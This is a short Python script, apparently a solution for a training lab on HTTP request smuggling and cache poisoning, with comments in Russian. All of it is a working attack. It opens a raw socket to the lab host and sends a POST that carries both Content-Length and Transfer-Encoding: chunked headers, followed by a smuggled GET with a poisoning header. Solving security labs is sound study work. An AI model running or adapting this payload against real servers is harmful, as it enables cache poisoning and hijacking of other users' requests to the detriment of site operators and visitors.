import socket

# Цели
host = "laplasrouse2-http_request_smuggling_cache_poison.labs-is-here.online"
port = 80

# Smuggling payload: два запроса в одном соединении!
payload = (
    "POST /last_post HTTP/1.1\r\n"
    f"Host: {host}\r\n"
    "Content-Length: 13\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "0\r\n"
    "\r\n"
    "GET /last_post HTTP/1.1\r\n"
    f"Host: {host}\r\n"
    "X-Smuggle-Poison: 1\r\n"
    "\r\n"
)

# Соединяемся raw, чтобы отправить payload
with socket.create_connection((host, port)) as s:
    s.sendall(payload.encode())
    response = s.recv(4096)
    print(response.decode(errors="ignore"))

